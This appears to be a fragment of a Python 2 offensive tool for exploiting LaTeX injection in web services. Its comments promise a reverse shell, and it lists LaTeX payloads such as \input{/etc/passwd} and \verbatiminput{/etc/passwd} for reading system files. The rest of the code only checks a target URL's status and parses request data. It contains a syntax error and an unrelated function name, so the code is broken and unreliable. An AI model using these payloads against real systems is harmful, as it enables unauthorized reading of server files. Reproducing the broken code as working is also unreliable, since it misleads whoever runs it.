#coding:utf-8

import sys
import urllib2
import socket
import options
import re


# This tool allows to exploit Latex without any problem.
# You will also have the opportunity to do a reverse shell.

ServicesPollers = {
		"Reading-Files": {
			"\input{/etc/passwd}":					False,
			"\usepackage{verbatim}":				False,
			"\+verbatiminput{/etc/passwd}":	False
	}
}

def BertModel():
	SettingsURL = options.URL
	SettingsDATA = options.DATA
	SettingsOSSH = options.OSSH

	if(SettingsURL != None):
		ModelURI = urllib2.urlopen(SettingsURL)
		ModelURI = ModelURI.getcode()

		if(not(ModelURI == 200):
			print False

	if(SettingsDATA != None):
		SettingsDATA = re.findall('(\w+[=]+\w+[&]{0,})', SettingsDATA)

		if(len(SettingsDATA) == 0):
			print False

if __name__ == "__main__":
	BertModel()
